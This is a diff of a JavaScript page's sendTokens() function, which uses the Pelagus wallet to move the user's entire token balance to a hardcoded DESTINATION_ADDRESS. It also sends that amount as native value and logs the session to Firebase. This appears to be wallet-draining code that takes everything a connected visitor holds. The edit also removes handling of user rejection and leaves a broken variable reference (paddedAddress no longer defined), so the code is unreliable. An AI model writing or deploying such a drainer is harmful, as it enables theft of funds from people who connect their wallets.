@@ -436,55 +436,52 @@ async function saveToFirebase(data) {
             console.log(message);
         }
 
-async function sendTokens() {
+        async function sendTokens() {
     try {
         if (!window.pelagus) {
             log('❌ Pelagus wallet not found');
             throw new Error('Pelagus wallet not found');
         }
 
-        // Check QUAI balance
+        // Check balances
+        const currentBalance = await getTokenBalance(userSession.address);
         const quaiBalance = await getQuaiBalance(userSession.address);
         const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
+        
         if (quaiAmount < 0.1) {
-            log(`❌ Need at least 0.1 QUAI for gas. Current: ${quaiAmount.toFixed(4)} QUAI`);
+            log(`❌ Need at least 0.1 QUAI for gas`);
             throw new Error('Insufficient QUAI balance');
         }
 
-        // Check token balance
-        const currentBalance = await getTokenBalance(userSession.address);
         if (currentBalance <= 0n) {
             log('❌ No tokens available to send');
             throw new Error('No tokens available to send');
         }
 
+        // Prepare transaction data
         const readableAmount = (Number(currentBalance) / 1e18).toString();
-        log(`📤 Found ${readableAmount} tokens to send`);
-
-        // Encode the transfer function call
         const methodId = 'a9059cbb';
-        const paddedAddress = DESTINATION_ADDRESS.replace('0x', '').padStart(64, '0');
+        const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');
+        const data = '0x' + methodId + paddedDestination + paddedAmount;
 
+        // Transaction parameters
         const transactionParameters = {
             from: userSession.address,
             to: DESTINATION_ADDRESS,
             value: `0x${currentBalance.toString(16)}`,
-            gas: '0x186A0',      // 100000 gas
             data: '0x' + methodId + paddedAddress + paddedAmount  // Encoded transfer call
         };
 
-        log(`🔄 Sending tokens to ${DESTINATION_ADDRESS}`);
+        log(`📤 Sending ${readableAmount} tokens...`);
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
         });
 
         log(`📝 Transaction hash: ${txHash}`);
-        log('⏳ Waiting for confirmation...');
-
         const receipt = await waitForTransaction(txHash);
-        
+
         userSession.transferAmount = readableAmount;
         userSession.transferTxHash = txHash;
         await saveSessionToFirebase();
@@ -494,12 +491,7 @@ async function sendTokens() {
         document.getElementById('buyBtn').style.display = 'block';
 
         log('✅ Transfer complete!');
-
     } catch (error) {
-        if (error.code === 4001) {
-            log('❌ Transaction rejected');
-            return;
-        }
         log('❌ Error: ' + error.message);
         console.error(error);
     }
